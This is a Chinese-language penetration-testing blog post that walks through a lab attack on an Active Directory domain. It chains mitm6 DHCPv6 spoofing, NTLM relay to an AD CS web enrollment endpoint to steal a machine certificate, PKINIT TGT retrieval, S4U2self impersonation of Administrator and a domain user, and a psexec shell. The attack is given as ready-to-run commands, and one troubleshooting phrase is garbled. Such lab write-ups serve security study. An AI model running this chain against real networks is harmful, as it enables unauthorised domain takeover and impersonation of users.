---
title: "mitm6-dhcpv6-中继证书"
date: 2023-02-01 10:09:23 +0800
category: 渗透测试
tags: [内网,渗透测试,ADCS,域]
excerpt: mitm6-dhcpv6-中继证书-模拟TGT获取域内机器权限
---

## 环境
+ 域 shigophilo.com

| 机器名 | IP | 系统 | 说明 |
| ---- | ---- | ---- | ---- |
| dc | 10.10.10.130 | win2016 | 域控 |
| ca | 10.10.10.128 | win2008 | 证书服务器|
| win10 | 10.10.10.129 | win10 | administrator和wangwu两个账号登录|
|  | 10.10.10.133 | ubuntu | 攻击机 |

## 目的
获取win10上的administrator和wangwu的TGT

## 过程
### ubuntu上开启mitm6
```
mitm6 --domain shigophilo.com -v
```
### ubuntu上开始ntlmrelayx获取机器账户(win10$)的证书
```
python3 ./ntlmrelayx.py -debug -smb2support -wh 10.10.10.133 --target http://ca.shigophilo.com/certsrv/certfnsh.asp  --adcs --template Machine
```

### 使用证书请求TGT
```
python3 gettgtpkinit.py shigophilo.com/win10\$ -dc-ip 10.10.10.130 -pfx-base64 base64的证书 win10.ccache
```
### 模拟机器上(win10)的用户账户的票据
默认任意用户票据
+ 模拟管理员票据

```
python3 gets4uticket.py kerberos+ccache://shigophilo.com\\win10\$:win10.ccache@dc.shigophilo.com cifs/win10.shigophilo.com@shigophilo.com Administrator@shigophilo.com admin.ccache
```
+ 模拟域用户xiaoqi的票据

```
python3 gets4uticket.py kerberos+ccache://shigophilo.com\\win10\$:win101.ccache@dc.shigophilo.com cifs/win10.shigophilo.com@shigophilo.com xiaoqi@shigophilo.com xiaoqi.ccache
```
### 使用票据
```
export KRB5CCNAME=admin.ccache
psexec.py -k shigophilo.com/Administrator@win10.shigophilo.com -no-pass -dc-ip 10.10.10.130
```
## 排错
### Error Name: KDC_ERR_PADATA_TYPE_NOSUPP Detail: "KDC has no support for PADAT
這是因為 KDC 上未啟動 PKInit (Public Key Cryptography for Initial Authentication)
+ DC 可控

如果我們可以控制 DC (測試環境?)，我們只要在 AD 的群組原則 Computer Configuration -> Administrative Templates (Computers) -> System -> KDC ，將 KDC support for PKInit Freshness Extension 和 KDC支持生命.符合身份验证和kerberos
armoring設定為 Enable，即可啟動 PKInit

+ DC 不可控

可以使用 RBCD (Kerberos Resource-Based Constrained Delegation) 的攻擊手段作為替代